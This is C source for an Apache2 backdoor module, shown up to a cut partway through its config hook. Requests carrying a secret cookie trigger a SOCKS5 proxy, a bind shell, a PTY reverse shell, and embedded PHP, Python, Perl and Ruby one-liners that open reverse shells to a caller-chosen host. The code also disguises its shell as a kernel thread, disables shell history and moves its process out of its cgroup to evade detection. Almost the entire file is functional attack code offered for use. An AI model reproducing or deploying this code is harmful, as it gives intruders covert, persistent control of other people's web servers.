/* ------------------------------------*/
/* Apache2 Backdoor module (@RicoVlad) */
/* ------------------------------------*/

/* Idea inspired from @TheXC3LL */
// https://www.tarlogic.com/en/blog/backdoors-modulos-apache/
/* ************************************************************* */
//Socks5 code inspired from https://github.com/fgssfgss/socks_proxy
/* ************************************************************* */

#include <sys/types.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/fcntl.h>
#include <netdb.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <dirent.h>
#include <sys/un.h>

// forkpty() --> https://linux.die.net/man/3/forkpty
// Need to link with libutil to use it in apache2 module
#include <pty.h>

#include <sys/mount.h>

#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "http_log.h"
#include "ap_config.h"


#include "mod_backdoor.h"


//////// SOCKS proxy ////////
#define _GNU_SOURCE
#define _POSIX_C_SOURCE 200809L
#include <pthread.h>
#include <limits.h>
#include "server.h"
#include "sblist.h"

#ifndef MAX
#define MAX(x, y) ((x) > (y) ? (x) : (y))
#endif

#if !defined(PTHREAD_STACK_MIN) || defined(__APPLE__)
/* MAC says its min is 8KB, but then crashes in our face. thx hunkOLard */
#undef PTHREAD_STACK_MIN
#define PTHREAD_STACK_MIN 64*1024
#elif defined(__GLIBC__)
#undef PTHREAD_STACK_MIN
#define PTHREAD_STACK_MIN 32*1024
#endif

static const char* auth_user;
static const char* auth_pass;
static sblist* auth_ips;
static pthread_mutex_t auth_ips_mutex = PTHREAD_MUTEX_INITIALIZER;
static const struct server* server;
static union sockaddr_union bind_addr = {.v4.sin_family = AF_UNSPEC};

enum socksstate {
    SS_1_CONNECTED,
    SS_2_NEED_AUTH, /* skipped if NO_AUTH method supported */
    SS_3_AUTHED,
};

enum authmethod {
    AM_NO_AUTH = 0,
    AM_GSSAPI = 1,
    AM_USERNAME = 2,
    AM_INVALID = 0xFF
};

enum errorcode {
    EC_SUCCESS = 0,
    EC_GENERAL_FAILURE = 1,
    EC_NOT_ALLOWED = 2,
    EC_NET_UNREACHABLE = 3,
    EC_HOST_UNREACHABLE = 4,
    EC_CONN_REFUSED = 5,
    EC_TTL_EXPIRED = 6,
    EC_COMMAND_NOT_SUPPORTED = 7,
    EC_ADDRESSTYPE_NOT_SUPPORTED = 8,
};

struct thread {
    pthread_t pt;
    struct client client;
    enum socksstate state;
    volatile int  done;
};


#ifndef CONFIG_LOG
#define CONFIG_LOG 1
#endif
#if CONFIG_LOG
/* we log to stderr because it's not using line buffering, i.e. malloc which would need
   locking when called from different threads. for the same reason we use dprintf,
   which writes directly to an fd. */
#define dolog(...) dprintf(2, __VA_ARGS__)
#else
static void dolog(const char* fmt, ...) { }
#endif

//////////////////////////////////////////

#define BUFSIZE 65536
#define IPSIZE 4
#define ARRAY_SIZE(x) (sizeof(x) / sizeof(x[0]))


#define PASSWORD "password=backdoor"
#define SOCKSWORD "/proxy"
#define STOPPROXY "imdonewithyou"
#define PINGWORD "/ping"
#define SHELLWORD "/revtty"
#define REVERSESHELL "/reverse"
#define BINDWORD "/bind"
#define CGROUP2 "/tmp/cgroup2"
#define IPC "/tmp/mod_backdoor"

pid_t pid;
static sblist* pidList;

/****************************/
/// SOCKS proxy functions ///
/***************************/

static int connect_socks_target(unsigned char *buf, size_t n, struct client *client) {
    if(n < 5) return -EC_GENERAL_FAILURE;
    if(buf[0] != 5) return -EC_GENERAL_FAILURE;
    if(buf[1] != 1) return -EC_COMMAND_NOT_SUPPORTED; /* we support only CONNECT method */
    if(buf[2] != 0) return -EC_GENERAL_FAILURE; /* malformed packet */

    int af = AF_INET;
    size_t minlen = 4 + 4 + 2, l;
    char namebuf[256];
    struct addrinfo* remote;

    switch(buf[3]) {
        case 4: /* ipv6 */
            af = AF_INET6;
            minlen = 4 + 2 + 16;
            /* fall through */
        case 1: /* ipv4 */
            if(n < minlen) return -EC_GENERAL_FAILURE;
            if(namebuf != inet_ntop(af, buf+4, namebuf, sizeof namebuf))
                return -EC_GENERAL_FAILURE; /* malformed or too long addr */
            break;
        case 3: /* dns name */
            l = buf[4];
            minlen = 4 + 2 + l + 1;
            if(n < 4 + 2 + l + 1) return -EC_GENERAL_FAILURE;
            memcpy(namebuf, buf+4+1, l);
            namebuf[l] = 0;
            break;
        default:
            return -EC_ADDRESSTYPE_NOT_SUPPORTED;
    }
    unsigned short port;
    port = (buf[minlen-2] << 8) | buf[minlen-1];
    /* there's no suitable errorcode in rfc1928 for dns lookup failure */
    if(resolve(namebuf, port, &remote)) return -EC_GENERAL_FAILURE;
    int fd = socket(remote->ai_addr->sa_family, SOCK_STREAM, 0);
    if(fd == -1) {
        eval_errno:
        if(fd != -1) close(fd);
        freeaddrinfo(remote);
        switch(errno) {
            case ETIMEDOUT:
                return -EC_TTL_EXPIRED;
            case EPROTOTYPE:
            case EPROTONOSUPPORT:
            case EAFNOSUPPORT:
                return -EC_ADDRESSTYPE_NOT_SUPPORTED;
            case ECONNREFUSED:
                return -EC_CONN_REFUSED;
            case ENETDOWN:
            case ENETUNREACH:
                return -EC_NET_UNREACHABLE;
            case EHOSTUNREACH:
                return -EC_HOST_UNREACHABLE;
            case EBADF:
            default:
                perror("socket/connect");
                return -EC_GENERAL_FAILURE;
        }
    }
    if(SOCKADDR_UNION_AF(&bind_addr) != AF_UNSPEC && bindtoip(fd, &bind_addr) == -1)
        goto eval_errno;
    if(connect(fd, remote->ai_addr, remote->ai_addrlen) == -1)
        goto eval_errno;

    freeaddrinfo(remote);
    if(CONFIG_LOG) {
        char clientname[256];
        af = SOCKADDR_UNION_AF(&client->addr);
        void *ipdata = SOCKADDR_UNION_ADDRESS(&client->addr);
        inet_ntop(af, ipdata, clientname, sizeof clientname);
        dolog("client[%d] %s: connected to %s:%d\n", client->fd, clientname, namebuf, port);
    }
    return fd;
}

static int is_authed(union sockaddr_union *client, union sockaddr_union *authedip) {
    int af = SOCKADDR_UNION_AF(authedip);
    if(af == SOCKADDR_UNION_AF(client)) {
        size_t cmpbytes = af == AF_INET ? 4 : 16;
        void *cmp1 = SOCKADDR_UNION_ADDRESS(client);
        void *cmp2 = SOCKADDR_UNION_ADDRESS(authedip);
        if(!memcmp(cmp1, cmp2, cmpbytes)) return 1;
    }
    return 0;
}

static enum authmethod check_auth_method(unsigned char *buf, size_t n, struct client*client) {
    if(buf[0] != 5) return AM_INVALID;
    size_t idx = 1;
    if(idx >= n ) return AM_INVALID;
    int n_methods = buf[idx];
    idx++;
    while(idx < n && n_methods > 0) {
        if(buf[idx] == AM_NO_AUTH) {
            if(!auth_user) return AM_NO_AUTH;
            else if(auth_ips) {
                size_t i;
                int authed = 0;
                pthread_mutex_lock(&auth_ips_mutex);
                for(i=0;i<sblist_getsize(auth_ips);i++) {
                    if((authed = is_authed(&client->addr, sblist_get(auth_ips, i))))
                        break;
                }
                pthread_mutex_unlock(&auth_ips_mutex);
                if(authed) return AM_NO_AUTH;
            }
        } else if(buf[idx] == AM_USERNAME) {
            if(auth_user) return AM_USERNAME;
        }
        idx++;
        n_methods--;
    }
    return AM_INVALID;
}

static void add_auth_ip(struct client*client) {
    pthread_mutex_lock(&auth_ips_mutex);
    sblist_add(auth_ips, &client->addr);
    pthread_mutex_unlock(&auth_ips_mutex);
}

static void send_auth_response(int fd, int version, enum authmethod meth) {
    unsigned char buf[2];
    buf[0] = version;
    buf[1] = meth;
    write(fd, buf, 2);
}

static void send_error(int fd, enum errorcode ec) {
    /* position 4 contains ATYP, the address type, which is the same as used in the connect
       request. we're lazy and return always IPV4 address type in errors. */
    char buf[10] = { 5, ec, 0, 1 /*AT_IPV4*/, 0,0,0,0, 0,0 };
    write(fd, buf, 10);
}

static void copyloop(int fd1, int fd2) {
    int maxfd = fd2;
    if(fd1 > fd2) maxfd = fd1;
    fd_set fdsc, fds;
    FD_ZERO(&fdsc);
    FD_SET(fd1, &fdsc);
    FD_SET(fd2, &fdsc);

    while(1) {
        memcpy(&fds, &fdsc, sizeof(fds));
        /* inactive connections are reaped after 15 min to free resources.
           usually programs send keep-alive packets so this should only happen
           when a connection is really unused. */
        struct timeval timeout = {.tv_sec = 60*15, .tv_usec = 0};
        switch(select(maxfd+1, &fds, 0, 0, &timeout)) {
            case 0:
                send_error(fd1, EC_TTL_EXPIRED);
                return;
            case -1:
                if(errno == EINTR) continue;
                else perror("select");
                return;
        }
        int infd = FD_ISSET(fd1, &fds) ? fd1 : fd2;
        int outfd = infd == fd2 ? fd1 : fd2;
        char buf[1024];
        ssize_t sent = 0, n = read(infd, buf, sizeof buf);
        if(n <= 0) return;
        while(sent < n) {
            ssize_t m = write(outfd, buf+sent, n-sent);
            if(m < 0) return;
            sent += m;
        }
    }
}

static enum errorcode check_credentials(unsigned char* buf, size_t n) {
    if(n < 5) return EC_GENERAL_FAILURE;
    if(buf[0] != 1) return EC_GENERAL_FAILURE;
    unsigned ulen, plen;
    ulen=buf[1];
    if(n < 2 + ulen + 2) return EC_GENERAL_FAILURE;
    plen=buf[2+ulen];
    if(n < 2 + ulen + 1 + plen) return EC_GENERAL_FAILURE;
    char user[256], pass[256];
    memcpy(user, buf+2, ulen);
    memcpy(pass, buf+2+ulen+1, plen);
    user[ulen] = 0;
    pass[plen] = 0;
    if(!strcmp(user, auth_user) && !strcmp(pass, auth_pass)) return EC_SUCCESS;
    return EC_NOT_ALLOWED;
}

static void* clientthread(void *data) {
    struct thread *t = data;
    t->state = SS_1_CONNECTED;
    unsigned char buf[1024];
    ssize_t n;
    int ret;
    int remotefd = -1;
    enum authmethod am;
    while((n = recv(t->client.fd, buf, sizeof buf, 0)) > 0) {
        // To kill proxy when you don't need it
        if(!strncmp(buf,STOPPROXY,strlen(STOPPROXY))){
            kill(getppid(),SIGKILL);
            exit(0);
        }
        switch(t->state) {
            case SS_1_CONNECTED:
                am = check_auth_method(buf, n, &t->client);
                if(am == AM_NO_AUTH) t->state = SS_3_AUTHED;
                else if (am == AM_USERNAME) t->state = SS_2_NEED_AUTH;
                send_auth_response(t->client.fd, 5, am);
                if(am == AM_INVALID) goto breakloop;
                break;
            case SS_2_NEED_AUTH:
                ret = check_credentials(buf, n);
                send_auth_response(t->client.fd, 1, ret);
                if(ret != EC_SUCCESS)
                    goto breakloop;
                t->state = SS_3_AUTHED;
                if(auth_ips) add_auth_ip(&t->client);
                break;
            case SS_3_AUTHED:
                ret = connect_socks_target(buf, n, &t->client);
                if(ret < 0) {
                    send_error(t->client.fd, ret*-1);
                    goto breakloop;
                }
                remotefd = ret;
                send_error(t->client.fd, EC_SUCCESS);
                copyloop(t->client.fd, remotefd);
                goto breakloop;
            //default:


        }
    }
    breakloop:

    if(remotefd != -1)
        close(remotefd);

    close(t->client.fd);
    t->done = 1;

    return 0;
}

static void collect(sblist *threads) {
    size_t i;
    for(i=0;i<sblist_getsize(threads);) {
        struct thread* thread = *((struct thread**)sblist_get(threads, i));
        if(thread->done) {
            pthread_join(thread->pt, 0);
            sblist_delete(threads, i);
            free(thread);
        } else
            i++;
    }
}

/* prevent username and password from showing up in top. */
static void zero_arg(char *s) {
    size_t i, l = strlen(s);
    for(i=0;i<l;i++) s[i] = 0;
}

int startProxy(int port, char* user){
    const char *listenip = "0.0.0.0";
    if(user != NULL){
        auth_ips = sblist_new(sizeof(union sockaddr_union), 8);
        auth_user = strdup(user);
        zero_arg(user);
        auth_pass = strdup(PASSWORD);
        //zero_arg(PASSWORD);
    }

    if((auth_user && !auth_pass) || (!auth_user && auth_pass)) {
        dprintf(2, "error: user and pass must be used together\n");
        return 1;
    }
    if(auth_ips && !auth_pass) {
        dprintf(2, "error: auth-once option must be used together with user/pass\n");
        return 1;
    }
    signal(SIGPIPE, SIG_IGN);
    struct server s;
    sblist *threads = sblist_new(sizeof (struct thread*), 8);
    if(server_setup(&s, listenip, port)) {
        perror("server_setup");
        return 1;
    }
    server = &s;
    size_t stacksz = MAX(8192, PTHREAD_STACK_MIN);  /* 4KB for us, 4KB for libc */

    while(1) {
        collect(threads);
        struct client c;
        struct thread *curr = malloc(sizeof (struct thread));
        if(!curr) goto oom;
        curr->done = 0;
        if(server_waitclient(&s, &c)) continue;
        curr->client = c;
        if(!sblist_add(threads, &curr)) {
            close(curr->client.fd);
            free(curr);
            oom:
            dolog("rejecting connection due to OOM\n");
            usleep(16); /* prevent 100% CPU usage in OOM situation */
            continue;
        }
        pthread_attr_t *a = 0, attr;
        if(pthread_attr_init(&attr) == 0) {
            a = &attr;
            pthread_attr_setstacksize(a, stacksz);
        }
        if(pthread_create(&curr->pt, a, clientthread, curr) != 0)
            dolog("pthread_create failed. OOM?\n");
        if(a) pthread_attr_destroy(&attr);
    }
}
/** END socks proxy functions **/
/*******************************************************************/


void shell(char* ip, char* port,char* prog) {
	int input[2];
	int output[2];
	int n, sr, revsockfd ;
	char buf[1024];

    struct sockaddr_in client_to_connect;
	pid_t spid;

	pipe(input);
	pipe(output);

	spid = fork();
    if (spid < 0) {
        //fprintf(stderr, "[-] Error: could not fork");
        exit(0);
    }else if (spid == 0){
		char *argv[] = { "[kintegrityd/2]", 0 };
        char *envp[] = { "HISTFILE=","TERM=vt100", 0 };
		close(input[1]);
		close(output[0]);

		spid = setsid();

        revsockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (revsockfd < 0 ){
            exit(0);
        }
        client_to_connect.sin_addr.s_addr = inet_addr(ip);
        client_to_connect.sin_family = AF_INET;
        client_to_connect.sin_port = htons(atoi(port));

        if (connect(revsockfd , (struct sockaddr *)&client_to_connect , sizeof(client_to_connect)) < 0)
        {
            exit(0);
        }

		dup2(revsockfd, 0);
		dup2(revsockfd, 1);
		dup2(revsockfd, 2);

		if(!strcmp(prog,"sh")){
            execve("/bin/sh", argv, envp);
		}
		if(!strcmp(prog,"bash")){
            execve("/bin/bash", argv, envp);
        }
        if(!strcmp(prog,"dash")){
            execve("/bin/dash", argv, envp);
        }
        if(!strcmp(prog,"ash")){
            execve("/bin/ash", argv, envp);
        }
        if(!strcmp(prog,"tcsh")){
            execve("/bin/tcsh", argv, envp);
        }
        if(!strcmp(prog,"ksh")){
            execve("/bin/ksh", argv, envp);
        }

	}else{ // Kill father to create daemon process
        exit(0);
    }

	return;
}

void reverseShell(char* ip, char* port, char* prog){

    pid_t spid;

    if(!strcmp(prog,"sh") || !strcmp(prog,"bash") || !strcmp(prog,"dash") || !strcmp(prog,"tcsh") || !strcmp(prog,"ash") || !strcmp(prog,"ksh")){
        shell(ip,port,prog);
    }else{
        spid = fork();
        if (spid < 0) {
            fprintf(stderr, "[-] Error: could not fork");
            exit(EXIT_FAILURE);
        }else if (spid == 0){

            if (!strcmp(prog,"php")){
                char* args[] = {"/usr/bin/php", "-r", "", NULL};
                args[2] = (char*) malloc(strlen("$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");")+strlen(ip)+strlen(port)+1);
                sprintf(args[2],"$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");",ip,port);
                execve(args[0], args, NULL);
                free(args[2]);
            }
            if (!strcmp(prog,"python")){
                char* args[] = {"/usr/bin/python", "-c", "", NULL};
                args[2] = (char*) malloc(strlen("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);")+strlen(ip)+strlen(port)+1);
                sprintf(args[2],"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);",ip,port);
                execve(args[0], args, NULL);
                free(args[2]);
            }
            if (!strcmp(prog,"perl")){
                char* args[] = {"/usr/bin/perl", "-e", "", NULL};
                args[2] = (char*) malloc(1+strlen(ip)+strlen(port)+strlen("use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"));
                sprintf(args[2],"use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};",ip,port);
                execve(args[0], args, NULL);
            }
            if (!strcmp(prog,"ruby")) {
                //ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<IP>","<PORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
                char* args[] = {"/usr/bin/ruby", "-rsocket", "-e", "", NULL};
                args[3] = (char*) malloc(1+strlen(ip)+strlen(port)+strlen("exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end"));
                sprintf(args[3],"exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end",ip,port);
                execve(args[0], args, NULL);
                free(args[3]);
            }

        }else{ // Father process
            exit(0);
        }
    }
    exit(0);
}


/****************************/
///      Forkpty() only    ///
/****************************/
void shellPTY(int socket) {

    struct termios terminal;
    int terminalfd, n = 0, sr;
    pid_t fpid;
    char buf[1024];

    fpid = forkpty(&terminalfd, NULL, NULL, NULL);

    if (fpid < 0) {
        fprintf(stderr, "[-] Error: could not forkpty");
        exit(EXIT_FAILURE);
    }
    else if (fpid == 0) { // Child process

        char *argv[] = { "[kintegrityd/2]", 0 };
        char *envp[] = { "HISTFILE=","TERM=vt100", 0 };

        execve("/bin/sh", argv, envp);
    }
    else { // Father process
        tcgetattr(terminalfd, &terminal);
        terminal.c_lflag &= ~ECHO;
        tcsetattr(terminalfd, TCSANOW, &terminal);
        fd_set readfd;

        for (;;) {
            FD_ZERO(&readfd);
            FD_SET(terminalfd, &readfd);
            FD_SET(socket, &readfd);
            // Bidirectional data transfer between 2 fd - terminalfd <--> IPC socket
            sr = select(terminalfd + 1, &readfd, NULL, NULL, NULL);
            if (sr) {
                if (FD_ISSET(terminalfd, &readfd)) {
                    memset(buf, 0, sizeof(buf));
                    n = read(terminalfd, buf, sizeof(strlen(buf)));
                    if (n <= 0) {
                        kill(fpid, SIGKILL);
                        break;
                    } else {
                        write(socket, buf, strlen(buf));
                    }
                }
                if (FD_ISSET(socket, &readfd)) {
                    memset(buf, 0, sizeof(buf));
                    n = read(socket, buf, sizeof(strlen(buf)));
                    if (n <= 0) {
                        kill(fpid, SIGKILL);
                        break;
                    } else {
                        write(terminalfd, buf, strlen(buf));
                    }
                }
            }
        }
        waitpid(fpid,NULL,0);
        exit(0);
    }
    return;
}

int bindPort(int fd, int port){
    int opt = 1;
    // Prepare Socket
    int bindSock = socket(AF_INET, SOCK_STREAM, 0);
    if (bindSock < 0 ){
        write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n"));
        exit(0);
    }

    if(setsockopt(bindSock, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        write(fd,"setsockopt",strlen("setsockopt"));
        close(bindSock);
        exit(0);
    }

    struct sockaddr_in server;
    int serverlen = sizeof(server);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(port);

    if (bind(bindSock, (struct sockaddr *)&server, sizeof(server))<0){
        write(fd,"Bind failed",strlen("Bind failed"));
        exit(0);
    }

    if (listen(bindSock, 3) < 0){
        write(fd,"Listen failed",strlen("Listen failed"));
        exit(0);
    }

    return bindSock;

}


void* bicomIPC(int sock, int revsockfd){
    char buf[1024];
    int n, sr;
    fd_set readset;
    for (;;) {
        FD_ZERO(&readset);
        FD_SET(sock,&readset);
        FD_SET(revsockfd,&readset);
        // Bidirectionnal data transfer between 2 fd - IPC sock <--> revsockfd
        sr = select(sock + 1, &readset, NULL, NULL, NULL);
        if (sr) {
            if (FD_ISSET(sock,&readset)) {
                memset(buf,0,1024);
                n = read(sock,buf,strlen(buf)+1);
                if (n <= 0){
                    break;
                }else{
                    write(revsockfd,buf,strlen(buf));
                }
            }
            if (FD_ISSET(revsockfd,&readset)) {
                memset(buf,0,1024);
                n = read(revsockfd,buf,strlen(buf)+1);
                if (n <= 0){
                    break;
                }else{
                    write(sock,buf,strlen(buf));
                }
            }
        }
    }
    return;
}


static int backdoor_post_read_request(request_rec *r) {
	int fd, sock, n, sr;
	fd_set readset;
	struct sockaddr_un server;
	struct timeval tv;

	apr_socket_t *client_socket;
	extern module core_module;

	const apr_array_header_t *fields;
    int i;
    apr_table_entry_t *e = 0;

	int backdoor = 0;

    fields = apr_table_elts(r->headers_in);
    e = (apr_table_entry_t *) fields->elts;
    for(i = 0; i < fields->nelts; i++) {
        if (!strcmp(e[i].key,"Cookie")) {
            if (strstr(e[i].val, PASSWORD)) {
                backdoor = 1;
            }
        }
    }


	if (backdoor == 0) {
		return DECLINED;
	}

	client_socket = ap_get_module_config(r->connection->conn_config, &core_module);
	if (client_socket) {
		fd = client_socket->socketdes;
	}

	if (strstr(r->uri, SOCKSWORD)) {

        sock = socket(AF_UNIX, SOCK_STREAM, 0);
        if (sock < 0) {
            write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n"));
            exit(0);
        }
        server.sun_family = AF_UNIX;
        strcpy(server.sun_path, IPC);
        if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
            close(sock);
            write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n"));
            exit(0);
        }

        write(sock,r->uri,strlen(r->uri));

        write(fd, "[+] Socks proxy binded !\n",strlen("[+] Socks proxy binded !\n"));
        close(fd);
        close(sock);

	}
	if (strstr(r->uri, BINDWORD)) {
	    int new_socket, bindfd;
        strtok(r->uri,"/");
        char* port = strtok(NULL,"/");

        sock = socket(AF_UNIX, SOCK_STREAM, 0);
        if (sock < 0) {
            write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n"));
            close(fd);
            exit(0);
        }
        server.sun_family = AF_UNIX;
        strcpy(server.sun_path, IPC);
        if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
            close(sock);
            write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n"));
            close(fd);
            exit(0);
        }


        bindfd = bindPort(fd,atoi(port));

        char* info = malloc(strlen(port)+strlen("[+] Shell binded on port %s\n"));
        sprintf(info,"[+] Shell binded on port %s\n",port);
        write(fd, info,strlen(info));
        free(info);
        close(fd);

        struct sockaddr_in server;
        int serverlen = sizeof(server);
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = INADDR_ANY;
        server.sin_port = htons(atoi(port));

        while(1){

            new_socket = accept(bindfd, (struct sockaddr *)&server, (socklen_t*)&serverlen);

            // To properly kill old shells
            close(bindfd);

            write(sock,"BIND",strlen("BIND"));
            bicomIPC(sock,new_socket);
            close(new_socket);
        }

    }

	if (!strcmp(r->uri, PINGWORD)) {
		write(fd, "[+] Backdoor module is running !\n", strlen("[+] Backdoor module is running !\n"));
		close(fd);
		exit(0);
	}

    if (strstr(r->uri, REVERSESHELL)) {
        char buf[1024];
        int sd[2], i;
        sock = socket(AF_UNIX, SOCK_STREAM, 0);
        if (sock < 0) {
            write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n"));
            exit(0);
        }
        server.sun_family = AF_UNIX;
        strcpy(server.sun_path, IPC);
        if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
            close(sock);
            write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n"));
            exit(0);
        }

        write(sock,r->uri,strlen(r->uri));
        strtok(r->uri,"/");
        char* ip = strtok(NULL,"/");
        char* port = strtok(NULL,"/");
        char* prog = strtok(NULL,"/");
        char* info = malloc(strlen("[+] Sending Reverse Shell to %s:%s using %s\n")+strlen(ip)+strlen(port)+strlen(prog)+2);
        sprintf(info,"[+] Sending Reverse Shell to %s:%s using %s\n",ip,port,prog);
        write(fd, info, strlen(info));
        free(info);

        close(fd);

        exit(0);
    }

	if (strstr(r->uri, SHELLWORD)) {
		if (pid) {
			/** Prepare socket to send reverse shell **/

			// Socket to send the reverse shell
            int revsockfd = socket(AF_INET, SOCK_STREAM, 0);
            if (revsockfd < 0 ){
                write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n"));
                exit(0);
            }

            strtok(r->uri,"/");
            char* ip = strtok(NULL,"/");
            char* port = strtok(NULL,"/");

            struct sockaddr_in client_to_connect;
            client_to_connect.sin_addr.s_addr = inet_addr(ip);
            client_to_connect.sin_family = AF_INET;
            client_to_connect.sin_port = htons(atoi(port));

            if (connect(revsockfd , (struct sockaddr *)&client_to_connect , sizeof(client_to_connect)) < 0)
            {
                write(fd, "[+] Reverse socket can't connect to client\n", strlen("[+] Reverse socket can't connect to client\n"));
                exit(0);
            }

            // IPC socket
			sock = socket(AF_UNIX, SOCK_STREAM, 0);
			if (sock < 0) {
				write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n"));
				exit(0);
			}
			server.sun_family = AF_UNIX;
			strcpy(server.sun_path, IPC);
			if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
				close(sock);
				write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n"));
				close(fd);
				exit(0);
			}
            // Tell IPC
            write(sock, "SHELL\n", strlen("SHELL\n") + 1);
			// Info in original socket
			char* info = malloc(strlen("Sending Reverse Shell to \n")+strlen(ip)+strlen(port)+2);
			sprintf(info,"[+] Sending Reverse Shell to %s:%s",ip,port);
			write(fd, info, strlen(info));
			free(info);

            close(fd);

            bicomIPC(sock,revsockfd);

			exit(0);
		}
	}

	return DECLINED;
}

void* rmCgroup(){
    int fd;
    int isMounted = 0;
    char* path;
    char* str;
    int thisPID;

    mkdir(CGROUP2, S_IRWXU);
    path = malloc(strlen(CGROUP2)+strlen("/system.slice/cgroup.procs")+1);
    strcat(path,CGROUP2);
    strcat(path,"/system.slice/cgroup.procs");
    if(access(path, F_OK) < 0) {
        isMounted= mount("cgroup",CGROUP2,"cgroup2",NULL,NULL);
    }
    if(isMounted == 0){
        fd = open(path,O_WRONLY);
        if(fd != -1){
            // TODO
            // -------> This is ugly <-----
            str = malloc(sizeof(int)*getpid());
            sprintf(str,"%d",getpid());
            write(fd,str,strlen(str)); // <---
            // ----------------------------
            free(str);
        }
        if (umount(CGROUP2) == 0 ){
            rmdir(CGROUP2);
        }
        free(path);
    }
}

/*void* amIAlone(){
    char pidLine[1024];
    char *opid;
    int i = 0;
    FILE *pidFile = popen("pidof apache2","r");
    fgets(pidLine,1024,pidFile);

    opid = strtok(pidLine," ");
    while(opid != NULL)
    {
        opid = strtok(NULL, " ");
        i++;
    }
    pclose(pidFile);
    if(i < 3){
        if (kill(getpid(),SIGTERM) == -1){
            kill(getpid(),SIGKILL);
        }
        return;
    }else{
        sleep(3);
        amIAlone();
    }
}*/

/*void* amIAlone(){

    size_t i = sblist_getsize(pidList);
    *//*while(1){
        for(i=0;i<sblist_getsize(pidList);i++) {
            if(kill(sblist_get(pidList,i),0) != 0){
                exit(0);
            }
        }
        sleep(1);
    }*//*
}*/

int waitIPC(int master){
    pthread_t thread_id;
    fd_set readfds;
    int rc, sd, sr;
    char buf[1024];

    //pthread_create(thread_id, NULL, amIAlone,NULL);
    //pthread_join(thread_id,NULL);

    /*pid = fork();
    if(pid == 0){
        pid = fork();
        if(pid==0){
            amIAlone();
        }else{
            exit(0);
        }
    }else{
        exit(0);
    }*/

    while(1) {
        FD_ZERO(&readfds);
        FD_SET(master, &readfds);

        // Read IPC socket
        sr = select(master + 1, &readfds, NULL, NULL, NULL);
        if(sr){
            if (FD_ISSET(master, &readfds)) {
                sd = accept(master, NULL, NULL);
                FD_SET(sd, &readfds);
                if (FD_ISSET(sd, &readfds)) {
                    memset(buf, 0, 1024);
                    if ((rc = read(sd, buf, 1024)) <= 0) {
                        close(sd);
                    } else {
                        pid = fork();
                        if(pid == 0){
                            if (strstr(buf, "SHELL") || strstr(buf, "BIND")) {
                                rmCgroup();
                                shellPTY(sd);
                            } else if (strstr(buf, "reverse")) {
                                rmCgroup();
                                // Monkey parsing url -->
                                strtok(buf, "/");
                                char *ip = strtok(NULL, "/");
                                char *port = strtok(NULL, "/");
                                char *prog = strtok(NULL, "/");
                                reverseShell(ip, port, prog);
                            }else if (strstr(buf,SOCKSWORD)){
                                strtok(buf, "/");
                                char *port = strtok(NULL, "/");
                                char* user = strtok(NULL, "/");
                                startProxy(atoi(port),user);
                            }
                        }else{
                            pid = fork();
                            if(pid == 0){
                                waitIPC(master);
                            }else{
                                exit(0);
                            }
                        }
                    }
                }
            }
        }
    }
}

void sig_handler(int signum)
{
    remove(IPC);
    if (signum == SIGKILL){
        exit(137);
    }
    if(signum == SIGTERM){
        exit(0);
    }
}

int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {
    // Clean old IPC to assure compatibility with non-systemd systems
    // systemd has a private /tmp for apache2, which is cleaned everytime the service (re)start
    // init-like process doesn't have private /tmp by default for apache2
    // That was an issue when restarting the apache2 service
    //apr_pool_cleanup_register(s->pool,NULL,removeIPC,apr_pool_cleanup_null);

    pid = fork();
    // Return father process just after he had loaded the config to create apache2 root daemon
